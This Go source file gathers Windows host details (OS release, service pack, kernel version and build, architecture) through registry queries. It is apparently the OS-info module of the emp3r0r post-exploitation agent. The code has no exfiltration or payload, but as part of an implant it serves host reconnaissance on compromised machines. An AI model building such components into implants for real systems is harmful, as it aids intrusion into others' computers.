//go:build windows
// +build windows

package agent

import (
	"fmt"
	"log"
	"runtime"
	"strings"
	"unsafe"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

func crossPlatformGetOSInfo() *OSInfo {
	osinfo := OSInfo{}
	osinfo.Name = "Windows"
	osinfo.Release = getOSRelease()
	osinfo.Version = GetKernelVersion()
	osinfo.Vendor = "Microsoft"
	osinfo.Kernel = osinfo.Version // let's see if this needs to be something else

	// OS arch
	osinfo.Architecture = runtime.GOARCH
	var (
		handle  windows.Handle
		isWoW64 bool // is 32 bit Go process but running on 64 bit Windows
	)
	err := windows.IsWow64Process(handle, &isWoW64)
	if err != nil {
		log.Printf("IsWow64Process: %v", err)
		return &osinfo
	}

	is64Go := strings.Contains(runtime.GOARCH, "64")
	if !is64Go {
		if isWoW64 {
			osinfo.Architecture = "x64"
		} else {
			osinfo.Architecture = "x32"
		}
	}

	return &osinfo
}

func getOSRelease() (release string) {
	var err error

	var h windows.Handle // like HostIDWithContext(), we query the registry using the raw windows.RegOpenKeyEx/RegQueryValueEx
	err = windows.RegOpenKeyEx(windows.HKEY_LOCAL_MACHINE, windows.StringToUTF16Ptr(`SOFTWARE\Microsoft\Windows NT\CurrentVersion`), 0, windows.KEY_READ|windows.KEY_WOW64_64KEY, &h)
	if err != nil {
		return
	}
	defer func() {
		err := windows.RegCloseKey(h)
		if err != nil {
			log.Printf("RegCloseKey: %v", err)
		}
	}()
	var bufLen uint32
	var valType uint32
	err = windows.RegQueryValueEx(h, windows.StringToUTF16Ptr(`ProductName`), nil, &valType, nil, &bufLen)
	if err != nil {
		log.Printf("Query ProductName: %v", err)
		release = "Unknown_Product"
	}
	regBuf := make([]uint16, bufLen/2+1)
	err = windows.RegQueryValueEx(h, windows.StringToUTF16Ptr(`ProductName`), nil, &valType, (*byte)(unsafe.Pointer(&regBuf[0])), &bufLen)
	if err != nil {
		log.Printf("Query ProductName: %v", err)
		release = "Unknown_Product"
	} else {
		release = windows.UTF16ToString(regBuf[:])
	}
	release = strings.TrimPrefix(release, "Microsoft")
	release = strings.TrimPrefix(release, "Windows")
	// append Service Pack number, only on success
	err = windows.RegQueryValueEx(h, windows.StringToUTF16Ptr(`CSDVersion`), nil, &valType, nil, &bufLen)
	if err != nil {
		log.Printf("CSDVersion: %v", err)
		release += " - Unknown_CSDVersion"
	} else {
		regBuf = make([]uint16, bufLen/2+1)
		err = windows.RegQueryValueEx(h, windows.StringToUTF16Ptr(`CSDVersion`), nil, &valType, (*byte)(unsafe.Pointer(&regBuf[0])), &bufLen)
		if err == nil {
			release = fmt.Sprintf("%s - %s", release, windows.UTF16ToString(regBuf[:]))
		}
	}

	return
}

func GetKernelVersion() (ver string) {
	log.Println("Reading kernel version...")
	ver = emp3r0r_data.Unknown
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.QUERY_VALUE)
	if err != nil {
		log.Print(err)
		return
	}
	defer k.Close()

	cv, _, err := k.GetStringValue("CurrentVersion")
	if err != nil {
		log.Print(err)
		return
	}
	ver = cv

	maj, _, err := k.GetIntegerValue("CurrentMajorVersionNumber")
	if err != nil {
		log.Print(err)
		return
	}
	ver = fmt.Sprintf("%s, NT %d", ver, maj)

	min, _, err := k.GetIntegerValue("CurrentMinorVersionNumber")
	if err != nil {
		log.Print(err)
		return
	}
	ver = fmt.Sprintf("%s.%d", ver, min)

	cb, _, err := k.GetStringValue("CurrentBuild")
	if err != nil {
		log.Print(err)
		return
	}
	ver = fmt.Sprintf("%s, build %s", ver, cb)

	return
}
